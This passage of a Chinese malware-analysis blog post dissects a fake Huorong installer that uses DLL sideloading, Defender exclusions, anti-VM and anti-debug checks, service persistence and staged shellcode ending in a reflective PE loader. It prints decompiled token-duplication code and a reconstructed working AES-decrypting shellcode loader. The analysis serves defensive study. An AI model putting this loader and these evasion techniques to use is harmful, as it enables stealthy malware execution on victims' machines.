+                ><br>另外就是jar包了，使用命令<code>jar -tf finalshell.jar</code>对其进行分析，发现太长了，利用<code>jar -tf finalshell.jar &gt; jar_tf.txt</code>输出到文件。利用输出可大致查看调用了哪些函数。<br>另外，还有dll文件，有可能被用于白加黑（而且检测到Utility.dll）有恶意行为，稍后详细分析。</p>
+<h2 id="6-白加黑分析"><a href="#6-白加黑分析" class="headerlink" title="6.白加黑分析"></a>6.白加黑分析</h2><p>从脚本可以看到，只执行了两个exe，这两个exe均是带签名的，那么恶意代码从哪加载？<br>仔细思考，那么既然，该样本是伪装的火绒，那么火绒浏览器的安装包存在，并不可疑，但是你这里放一个GameBox，是不是有点太可疑了？？？<br>由于GameBox是带签名的，那么程序本身大概率是不用分析的。<br>哎？到这里，有没有想起来[[#1.前置准备]]分析过的，它修改了dll加载顺序？<br>那么这里更有理由怀疑：GameBox.exe 运行时需要调用 Utility.dll ，然后攻击者劫持了 dll，造成了恶意代码加载：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_GameBoxInport.png"
+                      alt="2026-5-2_GameBoxInport"
+                ><br>到这里，基本确定了是白加黑，恶意代码存在于<code>Utility.dll</code>中，可以直接去分析<code>Utility.dll</code>了。</p>
+<h2 id="7-Utility-dll分析（CreateTipsManager）"><a href="#7-Utility-dll分析（CreateTipsManager）" class="headerlink" title="7.Utility.dll分析（CreateTipsManager）"></a>7.Utility.dll分析（CreateTipsManager）</h2><p>这里直接分析导出函数，因为应用程序能直接调用的就是导出函数了（还有另外的方式，自己加载dll，从资源表中招函数地址进行调用，这种方式直接隐藏导入表），由于这里导入表中存在Utility，证明它是调用了导出函数，另外，<code>GameBox.exe</code>是官方应用程序，带了签名，他也没办法修改代码自己加载dll。<br>分析<code>GetUtility</code>函数：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">GetUtility</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_10001160();</span><br><span class="line">  <span class="keyword">return</span> CreateTipsManager();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>那么需要详细分析的只有<code>CreateTipsManager</code>函数了。<br>首先，该程序会判断自己是否执行在server session下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_Server_Session.png"
+                      alt="2026-5-2_Server_Session"
+                ></p>
+<h3 id="ByPass-Windows-Defender"><a href="#ByPass-Windows-Defender" class="headerlink" title="&lt;1&gt;.ByPass Windows Defender"></a>&lt;1&gt;.ByPass Windows Defender</h3><p>随后，该程序调用函数，将需要用到的文件夹都添加到defender的排除项中：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_DefenderBypass.png"
+                      alt="2026-5-2_DefenderBypass"
+                ><br>同时，动态加载函数地址，避免导入表的检查：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_DynamicLoad.png"
+                      alt="2026-5-2_DynamicLoad"
+                ></p>
+<h3 id="提权，以用户身份启动"><a href="#提权，以用户身份启动" class="headerlink" title="&lt;2&gt;.提权，以用户身份启动"></a>&lt;2&gt;.提权，以用户身份启动</h3><p>随后，该程序会调用函数，复用system的Token，将session绑定到桌面，以用户桌面启动本进程：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_TiQuan.png"
+                      alt="2026-5-2_TiQuan"
+                ><br>这个代码值得学习，这里将源码放出来：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_10002EE0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  PSID *v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+10h] [ebp-380h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+5Ch] [ebp-334h] BYREF</span></span><br><span class="line">  HANDLE hExistingToken; <span class="comment">// [esp+6Ch] [ebp-324h] BYREF</span></span><br><span class="line">  LPVOID Environment; <span class="comment">// [esp+70h] [ebp-320h] BYREF</span></span><br><span class="line">  LPSTR StringSid; <span class="comment">// [esp+74h] [ebp-31Ch] BYREF</span></span><br><span class="line">  DWORD ReturnLength; <span class="comment">// [esp+78h] [ebp-318h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *phNewToken; <span class="comment">// [esp+7Ch] [ebp-314h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *TokenHandle; <span class="comment">// [esp+80h] [ebp-310h] BYREF</span></span><br><span class="line">  DWORD TokenInformation; <span class="comment">// [esp+84h] [ebp-30Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> Dst[<span class="number">264</span>]; <span class="comment">// [esp+88h] [ebp-308h] BYREF</span></span><br><span class="line">  CHAR Filename[<span class="number">508</span>]; <span class="comment">// [esp+190h] [ebp-200h] BYREF</span></span><br><span class="line"></span><br><span class="line">  func_nullptr();</span><br><span class="line">  func_nullptr_1();</span><br><span class="line">  TokenHandle = <span class="number">0</span>;</span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  <span class="keyword">if</span> ( OpenProcessToken(CurrentProcess, <span class="number">8u</span>, &amp;TokenHandle) )</span><br><span class="line">  &#123;</span><br><span class="line">    ReturnLength = <span class="number">0</span>;</span><br><span class="line">    GetTokenInformation(TokenHandle, TokenUser, <span class="number">0</span>, <span class="number">0</span>, &amp;ReturnLength);</span><br><span class="line">    v1 = (PSID *)<span class="built_in">malloc</span>(ReturnLength);</span><br><span class="line">    <span class="keyword">if</span> ( GetTokenInformation(TokenHandle, TokenUser, v1, ReturnLength, &amp;ReturnLength) )</span><br><span class="line">    &#123;</span><br><span class="line">      StringSid = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ConvertSidToStringSidA(*v1, &amp;StringSid) )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = <span class="built_in">strcmp</span>(StringSid, <span class="string">&quot;S-1-5-18&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">          v2 = v2 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v2 )                               <span class="comment">// 如果不是system退出逻辑</span></span><br><span class="line">        &#123;</span><br><span class="line">          CloseHandle(TokenHandle);</span><br><span class="line">          <span class="built_in">free</span>(v1);</span><br><span class="line">          LocalFree(StringSid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          CloseHandle(TokenHandle);</span><br><span class="line">          <span class="built_in">free</span>(v1);</span><br><span class="line">          LocalFree(StringSid);</span><br><span class="line">          <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="number">0x1F4u</span>);</span><br><span class="line">          <span class="keyword">if</span> ( GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104u</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = <span class="built_in">strrchr</span>(Filename, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">            v4 = v3 ? v3 + <span class="number">1</span> : Filename;</span><br><span class="line">            strcpy_s(Dst, <span class="number">0x104u</span>, v4);</span><br><span class="line">            <span class="keyword">if</span> ( !func_Check_Process_No_CurrentProcess(Dst) )<span class="comment">// 检查进程名不是当前进程</span></span><br><span class="line">            &#123;</span><br><span class="line">              hExistingToken = <span class="number">0</span>;</span><br><span class="line">              phNewToken = <span class="number">0</span>;</span><br><span class="line">              *(_DWORD *)&amp;Filename[<span class="built_in">strlen</span>(Filename)] = <span class="number">7548192</span>;</span><br><span class="line">              v5 = GetCurrentProcess();</span><br><span class="line">              <span class="keyword">if</span> ( OpenProcessToken(v5, <span class="number">0xF01FFu</span>, &amp;hExistingToken) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( DuplicateTokenEx(hExistingToken, <span class="number">0xF01FFu</span>, <span class="number">0</span>, SecurityIdentification, TokenPrimary, &amp;phNewToken) )<span class="comment">// Token复制</span></span><br><span class="line">                &#123;</span><br><span class="line">                  TokenInformation = WTSGetActiveConsoleSessionId();</span><br><span class="line">                  <span class="keyword">if</span> ( SetTokenInformation(phNewToken, TokenSessionId, &amp;TokenInformation, <span class="number">4u</span>) )<span class="comment">// Session绑定</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    StartupInfo.lpReserved = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">memset</span>(&amp;StartupInfo.lpTitle, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">                    StartupInfo.wShowWindow = <span class="number">5</span>;</span><br><span class="line">                    <span class="built_in">memset</span>(&amp;StartupInfo.cbReserved2, <span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line">                    ProcessInformation = <span class="number">0</span>;</span><br><span class="line">                    StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">                    StartupInfo.lpDesktop = <span class="string">&quot;WinSta0\\Default&quot;</span>;</span><br><span class="line">                    StartupInfo.dwFlags = <span class="number">1</span>;</span><br><span class="line">                    Environment = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( CreateEnvironmentBlock(&amp;Environment, phNewToken, <span class="number">0</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span> ( CreateProcessAsUserA(<span class="comment">// 以用户身份启动进程，无窗口</span></span><br><span class="line">                             phNewToken,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             Filename,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             <span class="number">0x430u</span>,</span><br><span class="line">                             Environment,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             &amp;StartupInfo,</span><br><span class="line">                             &amp;ProcessInformation) )</span><br><span class="line">                      &#123;</span><br><span class="line">                        CloseHandle(ProcessInformation.hProcess);</span><br><span class="line">                        CloseHandle(ProcessInformation.hThread);</span><br><span class="line">                        <span class="keyword">if</span> ( Environment )</span><br><span class="line">                          DestroyEnvironmentBlock(Environment);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( phNewToken &amp;&amp; phNewToken != (<span class="type">void</span> *)<span class="number">-1</span> )</span><br><span class="line">                CloseHandle(phNewToken);</span><br><span class="line">              <span class="keyword">if</span> ( hExistingToken &amp;&amp; hExistingToken != (HANDLE)<span class="number">-1</span> )</span><br><span class="line">                CloseHandle(hExistingToken);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        CloseHandle(TokenHandle);</span><br><span class="line">        <span class="built_in">free</span>(v1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CloseHandle(TokenHandle);</span><br><span class="line">      <span class="keyword">if</span> ( v1 )</span><br><span class="line">        <span class="built_in">free</span>(v1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="启动服务，回调函数分析"><a href="#启动服务，回调函数分析" class="headerlink" title="&lt;3&gt;.启动服务，回调函数分析"></a>&lt;3&gt;.启动服务，回调函数分析</h3><p>随后，继续检查当前SessionId，如果是0的话，就会启动服务，服务回调函数为<code>sub_100022C0</code>：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_ServerStart.png"
+                      alt="2026-5-2_ServerStart"
+                ><br>这里服务名为httpsvc，随后需要详细分析回调函数。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2025-5-2_ServerProc.png"
+                      alt="2025-5-2_ServerProc"
+                ><br>这里主要是启动了一个线程，继续分析该线程。</p>
+<h3 id="StartAddress"><a href="#StartAddress" class="headerlink" title="&lt;4&gt;.StartAddress"></a>&lt;4&gt;.StartAddress</h3><p>先来看一下该函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_StartAddress.png"
+                      alt="2026-5-2_StartAddress"
+                ><br>这里跟进函数详细分析。<br>首先分析<code>sub_10001C00</code>函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_AntiDbgAndVM.png"
+                      alt="2026-5-2_AntiDbgAndVM"
+                ><br>该函数是一个反虚拟机、反调试函数，其中利用的反调试策略：API检测和PEB检测，利用到的反虚拟机检测：磁盘大小检测、内存大小检测和CPU核心数检测。<br>完成该函数后，调用<code>sub_10002630</code>函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_CopyFileAndDeleteSelf.png"
+                      alt="2026-5-2_CopyFileAndDeleteSelf"
+                ><br>经过分析，该函数就是将释放的文件复制到指定目录（之前加入到Defender排除项的目录），并设置文件属性为隐藏。&#x3D;&#x3D;需要注意的是这里的user.dat。&#x3D;&#x3D;<br>执行完该函数之后，调用<code>sub_10001F20</code>函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_ServicesAuto.png"
+                      alt="2026-5-2_ServicesAuto"
+                ><br>该函数是一个标准的“服务级持久化模块”，用于将落地后的恶意程序以 SYSTEM 权限注册为开机自启服务，从而长期驻留系统。<br>随后，调用<code>sub_10002990</code>函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_10002990_1.png"
+                      alt="2026-5-2_10002990_1"
+                ><br>该函数中有大量的动态调用，将其规整起来，实际上就是ShellCode Loader，这里还原一下，方便后续分析：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">RunPayload</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!CheckEnvironment())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> filePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (!GetPayloadPath(filePath))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFileA(</span><br><span class="line">        filePath,</span><br><span class="line">        GENERIC_READ,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    LARGE_INTEGER size;</span><br><span class="line">    <span class="keyword">if</span> (!GetFileSizeEx(hFile, &amp;size))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size.HighPart != <span class="number">0</span> || size.LowPart == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    DWORD fileSize = size.LowPart;</span><br><span class="line"></span><br><span class="line">    BYTE* ShellCodeBuffer = (BYTE*)VirtualAlloc(<span class="literal">NULL</span>, fileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!ShellCodeBuffer) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    DWORD readSize = <span class="number">0</span>;</span><br><span class="line">    ReadFile(hFile, ShellCodeBuffer, fileSize, &amp;readSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readSize != fileSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    BYTE* payload = (BYTE*)VirtualAlloc(<span class="literal">NULL</span>, fileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!payload) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    DWORD outLen = fileSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// === 解密 ===</span></span><br><span class="line">    <span class="keyword">if</span> (!AESDecrypt(ShellCodeBuffer, fileSize, payload, &amp;outLen))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    VirtualFree(ShellCodeBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Sleep(rand() % 500 + 100);</span></span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect(payload, outLen, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = CreateThread(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)payload,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hThread)</span><br><span class="line">    &#123;</span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    VirtualFree(payload, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里就是很明显的ShellCode加载器，另外，对于ShellCode是经过加密的，这里分析一下解密函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_AES.png"
+                      alt="2026-5-2_AES"
+                ><br>要写解密脚本的话，我们还需要找到<code>pbIV</code>和<code>pbSecret</code>：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_pbIV.png"
+                      alt="2026-5-2_pbIV"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_pbSecret.png"
+                      alt="2026-5-2_pbSecret"
+                ></p>
+<h2 id="8-ShellCode分析"><a href="#8-ShellCode分析" class="headerlink" title="8.ShellCode分析"></a>8.ShellCode分析</h2><p>在这里，模拟写出ShellCode加载器（注意要进行解密，源代码放在最后，附录【1】），利用IDA进行动态调试，在函数指针调用的时候，跟进去即可看到反编译后的代码。<br>但是我发现，动态调试的时候，我还是没那么方便，我这里直接将解密后的<code>ShellCode</code>dump下来，写成函数指针调用，方便静态分析（源代码还是放在最后附录【2】）。<br>成功使IDA识别之后：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_ShellCode.png"
+                      alt="2026-5-2_ShellCode"
+                ><br>这更像是动态调用，利用hash寻找特定的函数地址，然后调用。动态跟进去发现算法真的很像动态寻找函数地址的算法，动静结合一下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_ShellCode_1.png"
+                      alt="2026-5-2_ShellCode_1"
+                ><br>发现在函数开始的部分，都是在动态寻找函数地址，构造出一个函数地址表，然后从ShellCode的<code>codemark</code>后面提取出ip地址：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_FuncAddressTable.png"
+                      alt="2026-5-2_FuncAddressTable"
+                ><br>在函数地址表构建完成之后，进入循环：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_while.png"
+                      alt="2026-5-2_while"
+                ><br>进入函数详细分析发现，其中ShellCode后半段的明文字段，实际上是配置：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_config.png"
+                      alt="2026-5-2_config"
+                ><br>进入函数详细分析，这里是在拉取第二段payload：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_sub_1D22EE_1.png"
+                      alt="2026-5-2_sub_1D22EE_1"
+                ><br>分块拉去下来之后，还有解密部分，解密完成之后，通过函数指针调用：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_sub_1D22EE_2.png"
+                      alt="2026-5-2_sub_1D22EE_2"
+                ><br>写代码，将Payload2拉取下来，分析一下，代码放在附录【3】。</p>
+<h2 id="9-Payload2分析"><a href="#9-Payload2分析" class="headerlink" title="9.Payload2分析"></a>9.Payload2分析</h2><p>在第二段载荷中，明显看到了PE文件：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_Payload2_PE.png"
+                      alt="2026-5-2_Payload2_PE"
+                ><br>这里大概率是释放这个PE文件并执行，先分析一下ShellCode，这里应该只有很少的一段。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_Payload2_main.png"
+                      alt="2026-5-4_Payload2_main"
+                ><br>这里手法与第一阶段的ShellCode手法非常类似，首先动态加载函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_Payload2_LoadFunc.png"
+                      alt="2026-5-4_Payload2_LoadFunc"
+                ><br>根据调试结果，来看一下函数地址表：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_FuncAddrTable.png"
+                      alt="2026-5-4_FuncAddrTable"
+                ><br>构建好函数地址表之后，进入<code>sub_5171CB</code>函数：<br>首先，校验PE的合法性，从这里可以分析出，前面的数据操作是为了寻找Pyaload中PE的位置：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_CheckPE.png"
+                      alt="2026-5-4_CheckPE"
+                ><br>校验完PE的和发行之后，申请内存，将PE头进行拷贝：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_CopyPEHeader.png"
+                      alt="2026-5-4_CopyPEHeader"
+                ><br>完成之后，修复重定位表和导入表：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_Reloaction.png"
+                      alt="2026-5-4_Reloaction"
+                ><br>随后调用了入口点：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_Pyaload2_entry.png"
+                      alt="2026-5-4_Pyaload2_entry"
+                ><br>那么可以确定，这是一个<strong>内存反射加载型恶意程序（Reflective Loader）</strong>。<br>最后，还从PE文件中寻找load函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_Payload2_load.png"
+                      alt="2026-5-4_Payload2_load"
+                ><br>接下来，需要将PE文件修复好，进行详细分析。</p>
+<h2 id="10最终载荷分析"><a href="#10最终载荷分析" class="headerlink" title="10最终载荷分析"></a>10最终载荷分析</h2><p>该文件是一个DLL文件：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_Last_DIE.png"
